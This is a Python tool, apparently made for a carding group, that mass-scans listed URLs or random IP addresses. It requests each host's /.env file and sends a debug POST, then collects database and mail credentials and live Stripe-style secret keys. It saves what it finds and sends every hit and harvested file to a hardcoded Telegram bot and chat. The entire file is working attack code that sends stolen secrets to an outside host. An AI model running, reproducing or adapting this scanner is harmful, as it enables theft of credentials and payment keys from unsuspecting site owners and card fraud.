import re
import os
import urllib3
import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\033[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'

skkey = 'sk_live'

total_checked = 0
total_not_found = 0
total_errors = 0

class ENV:
    def send_telegram_message(self, url, sk_key):
        telegram_api_url = 'https://api.telegram.org/bot7100144103:AAHO66V3e9zBXP_MMdhUZiqbAbzSFoQSa0c/sendMessage'
        message = f'/c𝗡𝗘𝗪 𝗦𝗞 𝗛𝗜𝗧𝗘𝗗\n\n<code>{sk_key}</code>\n\n𝗙𝗥𝗢𝗠 𝗧𝗛𝗜𝗦 𝗨𝗥𝗟\n{url}'
        params = {'chat_id': '6589065442', 'text': message, 'parse_mode': 'HTML'}
        try:
            response = requests.get(telegram_api_url, params=params)
            response.raise_for_status()
        except Exception as e:
            print(f'{xcol.LRED}Error sending message: {e}{xcol.RESET}')

    def send_telegram_file(self, file_path):
        telegram_api_url = 'https://api.telegram.org/bot7100144103:AAHO66V3e9zBXP_MMdhUZiqbAbzSFoQSa0c/sendDocument'
        with open(file_path, 'rb') as file:
            files = {'document': file}
            params = {'chat_id': '6589065442'}
            try:
                response = requests.post(telegram_api_url, files=files, data=params)
                response.raise_for_status()
            except Exception as e:
                print(f'{xcol.LRED}Error sending file: {e}{xcol.RESET}')

    def sanitize_url(self, url):
        return url.replace('https://', '')

    def scan(self, url):
        global total_checked, total_not_found, total_errors
        sanitized_url = self.sanitize_url(url)
        mch_env = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', skkey, 'APP_ENV=']
        mch_debug = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', skkey, 'APP_DEBUG']
        total_checked += 1
        try:
            r_env = requests.get(f'https://{sanitized_url}/.env', verify=False, timeout=15, allow_redirects=False)
            r_debug = requests.post(f'https://{sanitized_url}', data={'debug': 'true'}, allow_redirects=False, verify=False, timeout=15)
            resp_env = r_env.text if r_env.status_code == 200 else ''
            resp_debug = r_debug.text if r_debug.status_code == 200 else ''
            if any((key in resp_env for key in mch_env)) or any((key in resp_debug for key in mch_debug)):
                rr = f'{xcol.LGREEN}[+] Found: https://{sanitized_url}'
                env_file_path = os.path.join('ENV_DEBUG', f'{sanitized_url}_env_debug.txt')
                with open(env_file_path, 'w', encoding='utf-8') as output:
                    output.write(f'ENV:\n{resp_env}\n\nDEBUG:\n{resp_debug}\n')
                    if skkey in resp_env or skkey in resp_debug:
                        sk_file_path = 'sk.txt'
                        with open(sk_file_path, 'a') as sk_file:
                            sk_file.write(f'URL: https://{sanitized_url}\n')
                            if skkey in resp_env:
                                sk_file.write('From ENV:\n')
                                lin = resp_env.splitlines()
                                for x in lin:
                                    if skkey in x:
                                        sk_key = re.sub(f'.*{skkey}', skkey, x).replace('\"', '')
                                        sk_file.write(f'{sk_key}\n')
                                        self.send_telegram_message(sanitized_url, sk_key)
                            if skkey in resp_debug:
                                sk_file.write('From DEBUG:\n')
                                lin = resp_debug.splitlines()
                                for x in lin:
                                    if skkey in x:
                                        sk_key = re.sub(f'.*{skkey}', skkey, x).replace('\"', '')
                                        sk_file.write(f'{sk_key}\n')
                                        self.send_telegram_message(sanitized_url, sk_key)
                            sk_file.write('\n')
                        self.send_telegram_file(sk_file_path)
                self.send_telegram_file(env_file_path)
            else:
                rr = f'{xcol.LXC}[-] Not Found: https://{sanitized_url}/.env'
                total_not_found += 1
            self.print_summary()
            print(rr, end='\r')
        except Exception:
            rr = f'{xcol.LRED}[-] Error in: https://{sanitized_url}/.env'
            total_errors += 1
            self.print_summary()
            print(rr, end='\r')

    def print_summary(self):
        # Clear the previous line and print updated summary
        print(f'\r{total_checked} CHECKED | {total_not_found} NOT FOUND | {total_errors} ERRORS', end='')

def generate_random_ip():
    return f'{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}'

def show_menu(env_instance):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{xcol.LRED}
  ____  _  __  _____ _   ___     __   ___     ____  _____ ____  _   _  ____ _____ ____  
 / ___|| |/ / | ____| \\ | \\ \\   / /  ( _ )   |  _ \\| ____| __ )| | | |/ ___| ____|  _ \\ 
 \\___ \\| ' /  |  _| |  \\| |\\ \\ / /   / _ \\/\\ | | | |  _| |  _ \\| | | | |  _|  _| | |_) |
  ___) | . \\  | |___| |\\  | \\ V /   | (_>  < | |_| | |___| |_) | |_| | |_| | |___|  _ < 
 |____/|_|\\_\\ |_____|_| \\_|  \\_/     \\___/\\/ |____/|_____|____/ \\___/ \\____|_____|_| \\_\\ 
    {xcol.RESET}
    𝕡𝕦𝕓𝕝𝕚𝕔 𝕘𝕣𝕠𝕦𝕡: @Onyx_CARDING
         𝕓𝕪: @Onyx_0NYX
    """)
    if not os.path.isdir('ENV_DEBUG'):
        os.makedirs('ENV_DEBUG')
    thrd = 100
    print(f'{xcol.LRED}MODE SELECTION{xcol.RESET}')
    print('──────────────────────────────────────────────')
    print(f'{xcol.LGREEN}Type 1{xcol.RESET} for URL path')
    print(f'{xcol.LRED}Type 2{xcol.RESET} for Auto Cracking With Ips')
    print(f'{xcol.LRED}Type 3{xcol.RESET} for IPs Generator')
    print('──────────────────────────────────────────────')
    choice = input(f'{xcol.LXC}Select mode: {xcol.RESET}')
    while choice not in ['1', '2', '3']:
        print(f'{xcol.LRED}Invalid choice, please try again.{xcol.RESET}')
        choice = input(f'{xcol.LXC}Select mode: {xcol.RESET}')
    return (choice, thrd)

if __name__ == '__main__':
    env_instance = ENV()
    while True:
        choice, thrd = show_menu(env_instance)
        argFile = []
        if choice == '1':
            while True:
                try:
                    inpFile = input(f'{xcol.GREY}[URLS PATH] : {xcol.RESET}')
                    with open(inpFile) as urlList:
                        argFile = urlList.read().splitlines()
                    with ThreadPoolExecutor(max_workers=thrd) as executor:
                        for data in argFile:
                            executor.submit(env_instance.scan, data)
                            time.sleep(0.05)
                except:
                    print(f'{xcol.LRED}Error: Invalid file path or file could not be opened.{xcol.RESET}')
                    continue
        elif choice == '2':
            while True:
                argFile = [generate_random_ip() for _ in range(100)]
                with ThreadPoolExecutor(max_workers=thrd) as executor:
                    for data in argFile:
                        executor.submit(env_instance.scan, data)
                        time.sleep(0.05)
        elif choice == '3':
            def generate_ip():
                return '.'.join((str(random.randint(1, 255)) for _ in range(4)))

            def generate_ip_list(num_ips):
                ip_list = [generate_ip() for _ in range(num_ips)]
                return ip_list

            def save_ip_list_to_file(ip_list, file_path):
                with open(file_path, 'w') as file:
                    for ip in ip_list:
                        file.write(f'{ip}\n')

            num_ips = int(input('Input Amount: '))
            file_path = 'ip_list.txt'
            ip_list = generate_ip_list(num_ips)
            save_ip_list_to_file(ip_list, file_path)
            print(f'Generated {num_ips} IP addresses and saved to {file_path}')
        input(f'\n\n\nPRESS {xcol.LRED}ENTER{xcol.RESET} TO CONTINUE')
